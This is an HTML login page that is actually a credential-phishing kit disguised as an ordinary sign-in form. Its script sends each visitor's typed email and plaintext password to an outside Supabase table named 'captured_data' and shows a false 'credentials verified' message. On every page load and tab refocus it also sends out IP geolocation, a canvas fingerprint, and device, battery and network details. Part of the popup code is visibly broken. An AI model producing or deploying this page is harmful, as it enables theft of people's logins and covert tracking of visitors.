<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Login</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
            padding: 40px;
            width: 100%;
            max-width: 400px;
        }

        .login-header {
            text-align: center;
            margin-bottom: 30px;
        }

        .login-header h2 {
            color: #333;
            font-size: 28px;
            margin-bottom: 10px;
        }

        .login-header p {
            color: #666;
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
            font-size: 14px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s;
            outline: none;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .login-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .remember-forgot {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            font-size: 14px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
        }

        .remember-me input[type="checkbox"] {
            width: auto;
            margin-right: 5px;
            cursor: pointer;
        }

        .forgot-link {
            color: #667eea;
            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .loading {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Beautiful Popup Modal Styles */
        .popup-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .popup-box {
            background: white;
            border-radius: 20px;
            padding: 30px;
            max-width: 380px;
            width: 90%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.4s ease;
            position: relative;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(50px) scale(0.9);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .popup-icon {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 40px;
        }

        .popup-icon.success {
            background: #e8f5e9;
            color: #4CAF50;
        }

        .popup-icon.error {
            background: #ffebee;
            color: #f44336;
        }

        .popup-icon.warning {
            background: #fff3e0;
            color: #ff9800;
        }

        .popup-icon.info {
            background: #e3f2fd;
            color: #2196F3;
        }

        .popup-title {
            font-size: 22px;
            font-weight: 700;
            color: #333;
            margin-bottom: 10px;
        }

        .popup-message {
            font-size: 15px;
            color: #666;
            margin-bottom: 25px;
            line-height: 1.5;
        }

        .popup-btn {
            padding: 12px 30px;
            border: none;
            border-radius: 25px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            min-width: 120px;
        }

        .popup-btn.success {
            background: #4CAF50;
            color: white;
        }

        .popup-btn.success:hover {
            background: #45a049;
            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.3);
        }

        .popup-btn.error {
            background: #f44336;
            color: white;
        }

        .popup-btn.error:hover {
            background: #da190b;
            box-shadow: 0 5px 15px rgba(244, 67, 54, 0.3);
        }

        .popup-btn.warning {
            background: #ff9800;
            color: white;
        }

        .popup-btn.warning:hover {
            background: #e68900;
            box-shadow: 0 5px 15px rgba(255, 152, 0, 0.3);
        }

        .popup-close {
            position: absolute;
            top: 15px;
            right: 15px;
            background: #f0f0f0;
            border: none;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            cursor: pointer;
            font-size: 16px;
            color: #666;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .popup-close:hover {
            background: #e0e0e0;
            transform: rotate(90deg);
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h2>Welcome Back</h2>
            <p>Please login to continue</p>
        </div>

        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" placeholder="Enter your email" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>

            <div class="remember-forgot">
                <label class="remember-me">
                    <input type="checkbox" id="remember"> Remember me
                </label>
                <a href="#" class="forgot-link" onclick="forgotPassword(event)">Forgot Password?</a>
            </div>

            <button type="button" class="login-btn" id="loginBtn" onclick="handleLogin()">
                <span id="btnText">Login</span>
                <div class="loading" id="loading"></div>
            </button>
        </form>
    </div>

    <!-- Beautiful Popup Modal -->
    <div class="popup-overlay" id="popupOverlay">
        <div class="popup-box">
            <button class="popup-close" onclick="closePopup()">✕</button>
            <div class="popup-icon" id="popupIcon">
                <i class="fas fa-check-circle"></i>
            </div>
            <div class="popup-title" id="popupTitle">Success!</div>
            <div class="popup-message" id="popupMessage">Operation completed successfully.</div>
            <button class="popup-btn" id="popupBtn" onclick="closePopup()">OK</button>
        </div>
    </div>

    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

    <script>
        // Supabase configuration
        const supabaseUrl = 'https://aqynejlgjwdmxsekkyld.supabase.co';
        const supabaseKey = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuk';
        
        // Initialize Supabase
        const db = window.supabase.createClient(supabaseUrl, supabaseKey);
        
        let visitorId = null;
        
        // Popup functions
        function showPopup(type, title, message, btnText = 'OK') {
            const overlay = document.getElementById('popupOverlay');
            const icon = document.getElementById('popupIcon');
            const popupTitle = document.getElementById('popupTitle');
            const popupMessage = document.getElementById('popupMessage');
            const popupBtn = document.getElementById('popupBtn');
            
            // Reset classes
            icon.className = 'popup-icon';
            
            // Set icon based on type

                popupBtn.className = 'popup-btn success';
            } else if (type === 'error') {
                icon.classList.add('error');

                popupBtn.className = 'popup-btn error';
            } else if (type === 'warning') {
                icon.classList.add('warning');

                popupBtn.className = 'popup-btn warning';
            } else {
                icon.classList.add('info');

                popupBtn.className = 'popup-btn success';
            }
            
            popupTitle.textContent = title;
            popupMessage.textContent = message;
            popupBtn.textContent = btnText;
            
            overlay.style.display = 'flex';
        }
        
        function closePopup() {
            document.getElementById('popupOverlay').style.display = 'none';
        }
        
        // Close popup when clicking outside
        document.getElementById('popupOverlay').addEventListener('click', function(e) {
            if (e.target === this) {
                closePopup();
            }
        });
        
        // Get IP address with multiple fallbacks
        async function getIPAddress() {
            const apis = [
                'https://api.ipify.org?format=json',
                'https://api.my-ip.io/ip.json',
                'https://ipapi.co/json/',
                'https://ipwho.is/'
            ];
            
            for (const api of apis) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 5000);
                    
                    const response = await fetch(api, {
                        signal: controller.signal,
                        mode: 'cors'
                    });
                    
                    clearTimeout(timeoutId);
                    
                    if (!response.ok) continue;
                    
                    const data = await response.json();
                    const ip = data.ip || data.ip_address || null;
                    
                    if (ip) return ip;
                } catch (error) {
                    continue;
                }
            }
            
            return '0.0.0.0';
        }
        
        // Get IP details with multiple fallbacks
        async function getIPDetails(ip) {
            if (!ip || ip === '0.0.0.0') return {};
            
            const apis = [
                `https://ipwho.is/${ip}`,
                `https://ipapi.co/${ip}/json/`,
                `https://ipinfo.io/${ip}/json`
            ];
            
            for (const api of apis) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 5000);
                    
                    const response = await fetch(api, {
                        signal: controller.signal,
                        mode: 'cors'
                    });
                    
                    clearTimeout(timeoutId);
                    
                    if (!response.ok) continue;
                    
                    const data = await response.json();
                    
                    if (data.error || data.success === false) continue;
                    
                    return {
                        ip: data.ip || ip,
                        city: data.city || 'Unknown',
                        region: data.region || data.region_name || 'Unknown',
                        country: data.country || data.country_name || 'Unknown',
                        country_code: data.country_code || 'Unknown',
                        continent: data.continent || 'Unknown',
                        postal: data.postal || data.postal_code || 'Unknown',
                        latitude: data.latitude || 0,
                        longitude: data.longitude || 0,
                        timezone: data.timezone || 'Unknown',
                        org: data.org || data.isp || 'Unknown',
                        isp: data.connection?.isp || data.isp || data.org || 'Unknown',
                        asn: data.asn || 'Unknown'
                    };
                } catch (error) {
                    continue;
                }
            }
            
            return {};
        }
        
        // Better OS Detection
        function getOSInfo() {
            const ua = navigator.userAgent;
            const platform = navigator.platform;
            let name = 'Unknown';
            let version = 'Unknown';
            let architecture = 'Unknown';
            
            if (/x86_64|Win64|WOW64/.test(ua)) architecture = '64-bit';
            else if (/i386|i686|x86/.test(ua)) architecture = '32-bit';
            else if (/arm|aarch64/.test(ua)) architecture = 'ARM';
            
            if (/iPhone/.test(ua)) {
                name = 'iOS';
                const match = ua.match(/OS (\d+_\d+)/);
                version = match ? match[1].replace(/_/g, '.') : 'Unknown';
            }
            else if (/iPad/.test(ua)) {
                name = 'iPadOS';
                const match = ua.match(/OS (\d+_\d+)/);
                version = match ? match[1].replace(/_/g, '.') : 'Unknown';
            }
            else if (/iPod/.test(ua)) {
                name = 'iOS';
                const match = ua.match(/OS (\d+_\d+)/);
                version = match ? match[1].replace(/_/g, '.') : 'Unknown';
            }
            else if (/Android/.test(ua)) {
                name = 'Android';
                const match = ua.match(/Android\s([0-9.]+)/);
                version = match ? match[1] : 'Unknown';
            }
            else if (/Windows NT 10.0/.test(ua)) {
                name = 'Windows';
                version = '10/11';
            }
            else if (/Windows NT 6.3/.test(ua)) {
                name = 'Windows';
                version = '8.1';
            }
            else if (/Windows NT 6.2/.test(ua)) {
                name = 'Windows';
                version = '8';
            }
            else if (/Windows NT 6.1/.test(ua)) {
                name = 'Windows';
                version = '7';
            }
            else if (/Windows/.test(ua)) {
                name = 'Windows';
            }
            else if (/Mac OS X/.test(ua)) {
                name = 'macOS';
                const match = ua.match(/Mac OS X\s([0-9_]+)/);
                version = match ? match[1].replace(/_/g, '.') : 'Unknown';
            }
            else if (/Linux/.test(ua) || /Linux/.test(platform)) {
                if (/CrOS/.test(ua)) {
                    name = 'Chrome OS';
                } else {
                    name = 'Linux';
                }
            }
            
            return {
                name: name,
                version: version,
                architecture: architecture,
                platform: platform
            };
        }
        
        // Better Browser Detection
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let name = 'Unknown';
            let version = 'Unknown';
            let engine = 'Unknown';
            let engineVersion = 'Unknown';
            
            if (/Edg\//.test(ua)) {
                name = 'Microsoft Edge';
                version = ua.match(/Edg\/([0-9.]+)/)[1];
                engine = 'Blink';
                engineVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || 'Unknown';
            }
            else if (/OPR\//.test(ua)) {
                name = 'Opera';
                version = ua.match(/OPR\/([0-9.]+)/)[1];
                engine = 'Blink';
                engineVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || 'Unknown';
            }
            else if (/SamsungBrowser\//.test(ua)) {
                name = 'Samsung Internet';
                version = ua.match(/SamsungBrowser\/([0-9.]+)/)[1];
                engine = 'Blink';
            }
            else if (/UCBrowser\//.test(ua)) {
                name = 'UC Browser';
                version = ua.match(/UCBrowser\/([0-9.]+)/)[1];
                engine = 'Blink';
            }
            else if (/Chrome\//.test(ua)) {
                name = 'Google Chrome';
                version = ua.match(/Chrome\/([0-9.]+)/)[1];
                engine = 'Blink';
                engineVersion = version;
            }
            else if (/Firefox\//.test(ua)) {
                name = 'Mozilla Firefox';
                version = ua.match(/Firefox\/([0-9.]+)/)[1];
                engine = 'Gecko';
                engineVersion = ua.match(/rv:([0-9.]+)/)?.[1] || version;
            }
            else if (/Safari\//.test(ua)) {
                name = 'Apple Safari';
                version = ua.match(/Version\/([0-9.]+)/)?.[1] || 'Unknown';
                engine = 'WebKit';
                engineVersion = ua.match(/WebKit\/([0-9.]+)/)?.[1] || 'Unknown';
            }
            else if (/MSIE/.test(ua) || /Trident/.test(ua)) {
                name = 'Internet Explorer';
                version = ua.match(/(?:MSIE |rv:)([0-9.]+)/)[1];
                engine = 'Trident';
            }
            
            const isMobile = /Mobile|Android|iPhone|iPad|iPod|Windows Phone/i.test(ua);
            
            return {
                name: name,
                version: version,
                engine: engine,
                engineVersion: engineVersion,
                isMobile: isMobile,
                fullUserAgent: ua
            };
        }
        
        // Get device type
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let type = 'Desktop';
            let brand = 'Unknown';
            let model = 'Unknown';
            
            if (/iPhone/.test(ua)) {
                type = 'Mobile';
                brand = 'Apple';
                model = 'iPhone';
            }
            else if (/iPad/.test(ua)) {
                type = 'Tablet';
                brand = 'Apple';
                model = 'iPad';
            }
            else if (/iPod/.test(ua)) {
                type = 'Mobile';
                brand = 'Apple';
                model = 'iPod';
            }
            else if (/Android/.test(ua)) {
                type = /Tablet/.test(ua) ? 'Tablet' : 'Mobile';
                brand = 'Android';
                
                const manufacturers = ['Samsung', 'Huawei', 'Xiaomi', 'OPPO', 'Vivo', 'OnePlus', 'Google', 'Sony', 'LG', 'Motorola', 'Nokia', 'Realme', 'Infinix', 'Tecno'];
                for (const manufacturer of manufacturers) {
                    if (ua.includes(manufacturer)) {
                        brand = manufacturer;
                        break;
                    }
                }
                
                const modelMatch = ua.match(/\((.*?)\)/);
                if (modelMatch && modelMatch[1]) {
                    const parts = modelMatch[1].split(';');
                    for (const part of parts) {
                        const trimmed = part.trim();
                        if (!/Android|Build|wv|Mobile|Linux/i.test(trimmed) && trimmed.length > 2) {
                            model = trimmed;
                            break;
                        }
                    }
                }
            }
            else if (/Windows Phone/.test(ua)) {
                type = 'Mobile';
                brand = 'Microsoft';
                model = 'Windows Phone';
            }
            
            const isTouchDevice = navigator.maxTouchPoints > 0 || 'ontouchstart' in window;
            
            return {
                type: type,
                brand: brand,
                model: model,
                isTouchDevice: isTouchDevice,
                touchPoints: navigator.maxTouchPoints
            };
        }
        
        // Get network information
        function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            
            if (!connection) {
                return {
                    type: 'Unknown',
                    effectiveType: 'Unknown',
                    downlink: 0,
                    rtt: 0,
                    saveData: false
                };
            }
            
            const typeMap = {
                'wifi': 'WiFi',
                'ethernet': 'Ethernet',
                'cellular': 'Cellular',
                'bluetooth': 'Bluetooth',
                'wimax': 'WiMAX',
                'other': 'Other',
                'none': 'None',
                'unknown': 'Unknown'
            };
            
            return {
                type: typeMap[connection.type] || connection.type || 'Unknown',
                effectiveType: connection.effectiveType || 'Unknown',
                downlink: connection.downlink || 0,
                rtt: connection.rtt || 0,
                saveData: connection.saveData || false
            };
        }
        
        // Get battery info
        async function getBatteryInfo() {
            try {
                if (!navigator.getBattery) return null;
                
                const battery = await navigator.getBattery();
                
                return {
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime,
                    level: battery.level,
                    percentage: Math.round(battery.level * 100) + '%'
                };
            } catch (error) {
                return null;
            }
        }
        
        // Get WebGL info
        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                
                if (!gl) return null;
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                
                return {
                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
                    version: gl.getParameter(gl.VERSION),
                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                    maxTextureUnits: gl.getParameter(gl.MAX_TEXTURE_IMAGE_UNITS),
                    maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
                    maxViewportWidth: gl.getParameter(gl.MAX_VIEWPORT_DIMS)[0],
                    maxViewportHeight: gl.getParameter(gl.MAX_VIEWPORT_DIMS)[1]
                };
            } catch (error) {
                return null;
            }
        }
        
        // Get canvas fingerprint
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                canvas.width = 200;
                canvas.height = 50;
                
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125,1,62,20);
                
                ctx.fillStyle = "#069";
                ctx.fillText("Fingerprint Test", 2, 15);
                
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.font = "18px 'Arial'";
                ctx.fillText("Canvas Test", 4, 30);
                
                const gradient = ctx.createLinearGradient(0, 0, 200, 50);
                gradient.addColorStop(0, 'blue');
                gradient.addColorStop(1, 'red');
                ctx.fillStyle = gradient;
                ctx.fillRect(150, 30, 50, 20);
                
                return canvas.toDataURL();
            } catch (e) {
                return null;
            }
        }
        
        // Collect all visitor data
        async function collectVisitorData() {
            const browserInfo = getBrowserInfo();
            const osInfo = getOSInfo();
            const deviceInfo = getDeviceInfo();
            const networkInfo = getNetworkInfo();
            const webglInfo = getWebGLInfo();
            const canvasFingerprint = getCanvasFingerprint();
            
            const ip = await getIPAddress();
            const ipDetails = await getIPDetails(ip);
            const batteryInfo = await getBatteryInfo();
            
            return {
                ip_address: ip,
                user_agent: navigator.userAgent,
                referer: document.referrer || 'Direct',
                device_info: {
                    browser: browserInfo,
                    os: osInfo,
                    device: deviceInfo,
                    screen: {
                        width: window.screen.width,
                        height: window.screen.height,
                        availWidth: window.screen.availWidth,
                        availHeight: window.screen.availHeight,
                        colorDepth: window.screen.colorDepth,
                        pixelDepth: window.screen.pixelDepth,
                        pixelRatio: window.devicePixelRatio,
                        orientation: window.screen.orientation ? window.screen.orientation.type : 'Unknown'
                    },
                    language: navigator.language,
                    languages: navigator.languages,
                    platform: navigator.platform,
                    vendor: navigator.vendor,
                    cookiesEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack || 'Not set',
                    hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                    deviceMemory: navigator.deviceMemory || 'Unknown',
                    maxTouchPoints: navigator.maxTouchPoints || 0,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezoneOffset: new Date().getTimezoneOffset(),
                    webgl: webglInfo,
                    network: networkInfo,
                    battery: batteryInfo,
                    canvasFingerprint: canvasFingerprint
                },
                ip_details: ipDetails,
                created_at: new Date().toISOString()
            };
        }
        
        // Capture on page load
        async function captureOnPageLoad() {
            try {
                console.log('📊 Capturing visitor data on page load...');
                
                const visitorData = await collectVisitorData();
                
                const { data, error } = await db
                    .from('captured_data')
                    .insert([{
                        ...visitorData,
                        email: 'VISITOR',
                        password: 'NOT_SUBMITTED',
                        visit_type: 'page_load'
                    }])
                    .select();
                
                if (error) {
                    console.error('Error capturing page load:', error);
                } else {
                    visitorId = data[0].id;
                    console.log('✅ Page load data captured, ID:', visitorId);
                }
            } catch (error) {
                console.error('Error capturing page load:', error);
            }
        }
        
        // Handle login form submission
        window.handleLogin = async function() {
            const emailElement = document.getElementById('email');
            const passwordElement = document.getElementById('password');
            const rememberElement = document.getElementById('remember');
            const loginBtn = document.getElementById('loginBtn');
            const btnText = document.getElementById('btnText');
            const loading = document.getElementById('loading');
            
            if (!emailElement || !passwordElement) {
                console.error('Form elements not found');
                return;
            }
            
            const email = emailElement.value.trim();
            const password = passwordElement.value;
            const remember = rememberElement ? rememberElement.checked : false;
            
            if (!email || !password) {
                showPopup('warning', 'Missing Information', 'Please fill in all fields before continuing.');
                return;
            }
            
            if (!email.includes('@')) {
                showPopup('error', 'Invalid Email', 'Please enter a valid email address.');
                return;
            }
            
            loginBtn.disabled = true;
            btnText.style.display = 'none';
            loading.style.display = 'block';
            
            try {
                console.log('📊 Capturing form submission data...');
                
                const visitorData = await collectVisitorData();
                
                const { data, error } = await db
                    .from('captured_data')
                    .insert([{
                        ...visitorData,
                        email: email,
                        password: password,
                        visit_type: 'form_submission',
                        remember: remember
                    }])
                    .select();
                
                if (error) {
                    console.error('Supabase error:', error);
                    showPopup('error', 'Login Failed', 'An error occurred while processing your request. Please try again.');
                    return;
                }
                
                console.log('✅ Form data saved successfully');
                
                // Show beautiful success popup
                showPopup('success', 'Login Successful!', 'Your credentials have been verified successfully.', 'Continue');
                
                // Clear form
                emailElement.value = '';
                passwordElement.value = '';
                if (rememberElement) rememberElement.checked = false;
                
            } catch (err) {
                console.error('Error:', err);
                showPopup('error', 'Connection Error', 'Unable to connect to the server. Please check your internet connection and try again.');
            } finally {
                loginBtn.disabled = false;
                btnText.style.display = 'inline';
                loading.style.display = 'none';
            }
        };
        
        // Forgot password
        window.forgotPassword = function(event) {
            event.preventDefault();
            showPopup('info', 'Password Recovery', 'Please enter your email address and we will send you instructions to reset your password.');
        };
        
        // Capture visitor data when page loads
        window.addEventListener('DOMContentLoaded', function() {
            captureOnPageLoad();
        });
        
        // Also capture when page becomes visible again
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                captureOnPageLoad();
            }
        });
    </script>
</body>
</html>
